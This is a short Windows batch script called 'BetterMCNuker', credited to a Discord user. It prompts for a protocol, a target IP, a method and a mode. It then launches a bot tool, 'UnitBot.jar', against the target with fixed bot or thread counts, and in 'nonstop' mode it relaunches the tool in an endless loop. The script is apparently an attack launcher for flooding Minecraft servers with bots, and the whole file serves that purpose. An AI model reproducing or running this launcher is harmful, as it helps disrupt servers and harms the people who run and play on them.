@echo off

:: Code by who#5301 discord // stonifam5 github

set errors=0
title %errors% Stops  /  BetterMCNuker / NULL:NULL / NULL NULL
set /p protoc="Protocol: "
title %errors% Stops  /  BetterMCNuker / %protoc%:NULL / NULL NULL
set /p ipc="IP: "
title %errors% Stops  /  BetterMCNuker / %protoc%:NULL / %modec% %ipc%
set /p methodc="Method: "
title %errors% Stops  /  BetterMCNuker / %protoc%:%methodc% / %modec% %ipc%
:reptomode
set /p modec="Mode: "
if /i %modec%==nonstop goto loop
if /i %modec%==normal goto norm
goto reptomode
:loop
cls
echo [BetterMCNuker by who#5301]
@echo.
@echo.
java -jar UnitBot.jar %ipc% %protoc% %methodc% 500 1000
set /a errors+=1
title %errors% Stops  /  BetterMCNuker / %protoc%:%methodc% / %modec% %ipc%
goto loop
:norm
cls
title BetterMCNuker / %protoc%:%methodc% / %modec% %ipc%
echo [BetterMCNuker by who#5301]
@echo.
@echo.
java -jar UnitBot.jar %ipc% %protoc% %methodc% 500 1000
exit